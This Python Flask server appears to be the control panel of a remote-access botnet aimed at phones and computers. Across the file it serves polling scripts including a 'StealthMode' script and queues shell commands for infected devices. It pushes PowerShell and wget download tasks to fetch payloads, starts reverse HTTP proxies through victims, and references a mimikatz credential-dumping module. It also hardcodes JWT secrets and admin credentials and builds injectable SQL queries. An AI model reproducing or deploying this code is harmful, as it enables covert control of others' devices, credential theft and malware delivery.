from flask import Flask, send_from_directory, request, make_response, jsonify
from flask_cors import CORS
import sqlite3, os, time
import random, subprocess
import socket, errno, re
import json, hashlib
import base64, requests
import threading
from datetime import datetime
import commands, jwt




app = Flask(__name__, static_url_path='')
cors = CORS(app)

devices_map = {}
active_Networks = {}
connected_users = {}
remoteaddr_map = {}
holding_line = []
android_package_name = "net.orange.bolt"

modules_ref = {'1':'discover', '2': 'ports', '3': 'mimikatz'}


def hashKey_(devid, ipaddr):
	devid, ipaddr = devid.encode("utf8"), ipaddr.encode("utf8")
	return hashlib.sha1(devid+ipaddr).hexdigest()[:12]


def customHash(passwd):
	return hashlib.sha1("JYF&6rfvJY^R&D^P+';5r*"+passwd+"JYF&6rfvJY^R&D^P+;5r*").hexdigest()[20:]


def customBase64(encodedTxt, decode=1):
	replacements_ = [['+', 'plus'], ['/', 'slash'], ['=', 'equal']]
	if decode == -1:
		encodedTxt = base64.b64encode(encodedTxt).encode('ascii')
		for i in replacements_:
			encodedTxt = encodedTxt.replace(i[0], i[1])
		return encodedTxt
	for i in replacements_:
		encodedTxt = encodedTxt.replace(i[::-1][0], i[::-1][1])
	return base64.b64decode(encodedTxt).encode('ascii')



def decode_jw_token(jw_token):
	try:
		payload = jwt.decode(jw_token, 'eae8beb812b03868ff7628cae7a73afadca8f5f94da28c0e')
		return payload['sub']
	except jwt.ExpiredSignatureError:
		return 0
	except jwt.InvalidTokenError:
		return 0



def sql_run(cmd ,db_name="main.db"):
	if not os.path.exists(db_name):
		os.system("touch main.db")
		sql_run("CREATE TABLE IF NOT EXISTS devices (ID INTEGER PRIMARY KEY AUTOINCREMENT, deviceuuid VARCHAR(32), latest_ip VARCHAR(32), firstconnection INTEGER, lastconnection INTEGER);")
		sql_run("CREATE TABLE IF NOT EXISTS connections (ID INTEGER PRIMARY KEY AUTOINCREMENT, remoteaddr VARCHAR(32), dtimestamp INTEGER);")		
		sql_run("CREATE TABLE IF NOT EXISTS downloads (ID INTEGER PRIMARY KEY AUTOINCREMENT, url VARCHAR(255), uuid VARCHAR(4), output VARCHAR(4), status VARCHAR(4));")
	sql = sqlite3.connect(db_name)
	sql_cursor = sql.cursor()
	sql_cursor.execute(cmd)
	dbmsg = 0
	try:
		dbmsg = sql_cursor.fetchall()
	except:
		dbmsg = sql_cursor.fetchone()
	sql.commit()
	sql_cursor.close()
	sql.close()
	return dbmsg


def timeoutController(process_obj):
	if process_obj.process_.poll() is not None:
		return 1
	elif int(time.time())-process_obj.process_timeout>90:
		process_obj.process_.kill()
		return 1
	return 0


class genShell:
	def __init__(self, deviceuuid, packagename=android_package_name):
		self.id = deviceuuid
		self.apitoken = customHash(deviceuuid)
		self.dataPath = "/data/data/" + packagename
		self.threaduid = random.randint(100000,999999)
		self.shelluid = self.id+'_{}'.format(self.threaduid)
		self.lport = self.setPort()
		self.tasks, self.platform = [], ''
		self.latestping, self.thread_busy = 0, 0
		self.process_ = subprocess.Popen("echo", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)

	def setPort(self):
		setp = random.randint(49152, 65535)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.bind(("0.0.0.0", setp))
		except socket.error as e:
			if e.errno == errno.EADDRINUSE:
				self.setPort()
			else:
				print(e)
		s.close()
		return setp

	def runCMD(self, shellcmd, shellcmd_index, assetName):
		self.process_timeout = int(time.time())
		runcmd_ = "\r\n{} 2>&1 | {}/elf.out {API_FQDN_IP} {} -w 10;\r\n".format(shellcmd, self.dataPath, self.lport)
		with open("assets/runsh_{}.sh".format(assetName), "w") as f:
			f.write(runcmd_)
		thread_filename = "threads/%dx%d"%(self.threaduid, self.tasks[shellcmd_index][2])
		bind_fd = "exec $(%s/misc/ncatBSD -l 0.0.0.0 -p %d -dN > %s && cp %s %s_ready)"%(os.getcwd(), self.lport, thread_filename, thread_filename, thread_filename)
		  
		self.process_ = subprocess.Popen(bind_fd, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
		self.tasks[shellcmd_index][1] = 'running'




@app.route('/checkupdate.js', methods=['GET'])
def initproc():
	global holding_line, android_package_name
	js_resp, assetName = "", ""
	isinit = request.args.get('token')
	deviceuuid = request.args.get('id')
	devicePlatform = request.args.get('platform')
	user_ip = request.remote_addr
	current_timestamp = int(time.time())
	deviceuuid = ''.join([i for i in deviceuuid if i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"])
	remoteaddr_map[deviceuuid] = user_ip
	while deviceuuid in holding_line:
		time.sleep(1)
	holding_line.append(deviceuuid)
	hashed_key_ = hashKey_(deviceuuid, user_ip)
	if hashed_key_ in devices_map.keys() and len(isinit)>1 and timeoutController(devices_map[hashed_key_]):
		exec_cmd_ = [i for i in devices_map[hashed_key_].tasks if i[1]=='pending']
		if len(exec_cmd_):
			exec_cmd_ = exec_cmd_[0]
			exec_cmd_index = devices_map[hashed_key_].tasks.index(exec_cmd_)
			exec_cmd_ = exec_cmd_[0]
			with open("JS_scripts/runshell.js", "r") as f:
				js_resp = f.read()
			assetName = devices_map[hashed_key_].shelluid+"_%d"%random.randint(100,999)
			js_resp = js_resp.replace("{shelluid}", assetName)
			devices_map[hashed_key_].runCMD(exec_cmd_, exec_cmd_index, assetName)
	elif isinit=='0' or hashed_key_ not in devices_map.keys():
		with open("JS_scripts/init.js", "r") as f:
			js_resp = f.read()
		with open("JS_scripts/StealthMode.js", "r") as f:
			js_resp += f.read()
		resp_ = sql_run("SELECT url, output FROM downloads WHERE uuid='{}' AND status='pending';".format(deviceuuid))
		if len(resp_):
			downList = str([[i[0].encode('utf8'), i[1].encode('utf8')] for i in resp_])
			js_resp = js_resp.replace("{pendingDownloads}", downList)
			sql_run("UPDATE downloads SET status='done' WHERE uuid='{}' AND status='pending';".format(deviceuuid))
		else:
			js_resp = js_resp.replace("{pendingDownloads}", "[]")
		device_ = genShell(deviceuuid)
		devices_map[hashed_key_] = device_
		js_resp = js_resp.replace("{shelluid}", devices_map[hashed_key_].shelluid)
	devices_map[hashed_key_].latestping = current_timestamp
	if devicePlatform:
		_ = customBase64(devicePlatform, 1)
		devices_map[hashed_key_].platform = _ if 'windows' not in _.lower() else 'Windows ' + ''.join([i for i in _.split(' ')[0] if i in '0123456789'])
	holding_line = filter(lambda x: x != deviceuuid, holding_line)
	resp_ = sql_run("SELECT deviceuuid FROM devices WHERE deviceuuid='{}';".format(deviceuuid))
	if not len(resp_):
		sql_run("INSERT INTO devices (deviceuuid, latest_ip, firstconnection, lastconnection) VALUES\
		 ('{}', '{}', '{}', '{}');".format(deviceuuid, user_ip, current_timestamp, current_timestamp))
	else:
		sql_run("UPDATE devices SET latest_ip='{}', lastconnection='{}' WHERE deviceuuid='{}';".format(user_ip, current_timestamp, deviceuuid))
	sql_run("INSERT INTO connections (remoteaddr, dtimestamp) VALUES ('{}', '{}');".format(user_ip, current_timestamp))
	if request.headers.get('User-Agent') == "JustKidding":
		try:
			with open("assets/runsh_{}.sh".format(assetName), "r") as f:
				js_resp = f.read()
				js_resp = "runcmd=" + js_resp[2:]
		except Exception as e:
			if len([i for i in devices_map[hashed_key_].tasks if i[1]=='pending']):
				js_resp = "runcmd=whoami"
			else:
				js_resp = "runcmd=sleep 30"
	return js_resp




@app.route('/pingtask', methods=['GET'])
def pingtask():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	taskid = request.args.get('taskid')
	deviceuuid = ''.join([i for i in deviceuuid if i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"])
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		filePath = "threads/{}_ready".format(taskid)
		if os.path.exists(filePath):
			recv_ = ""
			with open(filePath, "r") as f:
				recv_ = f.read()
			return recv_
	else:
		return {'message': "unAuthorized"}, 401
	return str(0)



@app.route('/livedevices', methods=['GET'])
def livedevices():
	apitoken = request.args.get('token')
	if decode_jw_token(apitoken):
		live_lst = [[devices_map[i].id, remoteaddr_map[devices_map[i].id], devices_map[i].platform, devices_map[i].threaduid, devices_map[i].tasks] for i in devices_map.keys() if int(time.time())-devices_map[i].latestping<=300]
		return json.dumps(live_lst)
	else:
		return {'message': "unAuthorized"}, 401



@app.route('/addtask', methods=['GET'])
def addtask():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	cmd_bs64 = request.args.get('cmd')
	gentaskid = random.randint(1000,9999)
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			cmd_bs64 = customBase64(cmd_bs64, 1)
		except:
			return {'message': "Not a valid command"}, 404
		try:
			devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].tasks.append([cmd_bs64, 'pending', gentaskid])
			return str(gentaskid)
		except KeyError as e:
			return {'message': "device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401
	return str(0)



@app.route('/pushdownload', methods=['GET'])
def pushDownload():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	url_bs64 = request.args.get('url')
	output = request.args.get('output')
	gentaskid = random.randint(1000,9999)
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			url_bs64 = customBase64(url_bs64,  1)
		except:
			return {'message': "Not a url"}, 401
		resp_ = sql_run("SELECT deviceuuid FROM devices WHERE deviceuuid='{}';".format(deviceuuid))
		if resp_:
			dev_platform = devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].platform.lower()
			if 'windows' in dev_platform:
				devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].tasks.append(['powershell -C "(New-Object Net.WebClient).DownloadFile(\'{}\', \'{}\')"'.format(url_bs64, output), 'pending', gentaskid])
			elif 'linux' in dev_platform:
				devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].tasks.append(["wget {} -o {}".format(url_bs64, output), 'pending', gentaskid])
			else:
				sql_run("INSERT INTO downloads (url, uuid, output, status) VALUES ('{}', '{}', '{}', 'pending');".format(url_bs64, deviceuuid, output))
			return str(1)
		else:
			return {'message': "device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401



@app.route('/runproxy', methods=['GET'])
def runproxy():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	threadid = request.args.get('threadid')
	newProxyForced = request.args.get('new')
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])]
			if deviceuuid in active_Networks.keys() and not newProxyForced:
				return json.dumps({'proxyInfo': active_Networks[deviceuuid]}), 200
			else:
				cmd_exec = "screen -S {} -d -m bash -c \"python reverse_http.py {} {}\"\n".format(hashlib.md5(deviceuuid).hexdigest()[:8], deviceuuid, threadid)
				serial_numb = '0000'
				if newProxyForced == '1':
					serial_numb = random.randint(1000,9999)
					try:
						del active_Networks[deviceuuid]
					except:
						pass
				with open("misc/initproxy.lst", 'a') as f:
					f.write(serial_numb+':'+cmd_exec)
				for i in range(15):
					time.sleep(2)
					if deviceuuid in active_Networks.keys():
						return json.dumps({'proxyInfo': active_Networks[deviceuuid]}), 200
				return {'message': "Failed due to ann internal issue"}, 500 
		except KeyError as e:
			return {'message': "device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401




@app.route('/runmodule', methods=['GET'])
def runModule():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	threadid = request.args.get('threadid')
	moduleID = request.args.get('module')
	argv_ast = request.args.get('args')
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		if moduleID not in modules_ref.keys():
			return {'message': 'Module not found'}, 404
		try:
			devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])]
			cmd_exec = "python modules/{}.py {} {}".format(modules_ref[moduleID], deviceuuid, threadid)
			if argv_ast:
				cmd_exec += ' {}'.format(customBase64(argv_ast))
			out_ = commands.getoutput(cmd_exec)
			return {'message': out_}, 200
		except KeyError as e:
			return {'message': "Device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401




@app.route('/killproxy', methods=['GET'])
def killProxy():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])]
			if deviceuuid in active_Networks.keys():
				cmd_exec = "screen -ls %s | grep -E '\s+[0-9]+\.' | awk -F ' ' '{print $1}' | while read s; do screen -XS $s quit; done"%(hashlib.md5(deviceuuid).hexdigest()[:8])
				del active_Networks[deviceuuid]
				commands.getoutput(cmd_exec)
				return "Done", 200
			else:

				return {'message': "No active proxy was found for this device"}, 404
		except KeyError as e:
			return {'message': "Device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401





@app.route('/cleartasks', methods=['GET'])
def cleartasks():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		cleared_tasks = [[i[0], 'running', i[2]] for i in devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].tasks]
		devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])].tasks = cleared_tasks
		return str(1)
	else:
		return {'message': "unAuthorized"}, 401
	return str(0)




@app.route('/pushproxy', methods=['GET'])
def pushproxy():
	deviceuuid = request.args.get('hashid')
	apitoken = request.args.get('token')
	proxyinfo = request.args.get('proxyinfo')
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		if hashKey_(deviceuuid, remoteaddr_map[deviceuuid]) in devices_map.keys():
			active_Networks[deviceuuid] = proxyinfo
			return str(1)
		else:
			return {'message': "device not found"}, 404
	else:
		return {'message': "unAuthorized"}, 401
	return str(0)



@app.route('/assets/<path:filename>')
def serve_static(filename):
	root_dir = os.path.abspath("assets")
	return send_from_directory(root_dir, filename)




@app.route('/login', methods=["POST"])
def login():
	userName = request.form.get('userName')
	passWord = request.form.get('passWord')

	if [userName,passWord] in [['admin','passwd']]:
		payload = {
			'sub': userName,
			'iat': int(time.time()),
			'exp': int(time.time())+3600,
		}

		encoded_jwt = jwt.encode(payload, 'eae8beb812b03868ff7628cae7a73afadca8f5f94da28c0e', algorithm='HS256')
		time.sleep(1)
		connected_users[userName] = encoded_jwt
		return json.dumps({'authToken': encoded_jwt, 'userName': userName}), 200
	return {'message':"unAuthorized"}, 401



@app.route('/logout', methods=["POST"])
def logout():
	authToken = request.form.get('authToken')
	userName = request.form.get('userName')
	if userName in connected_users.keys() and authToken == connected_users[userName]:
		del connected_users[userName]
	return "OK", 200




@app.route('/')
def index():
	return "Wait for it ... and it is on!"



if __name__ == '__main__':
	app.run(host="0.0.0.0", port=80, debug=True)

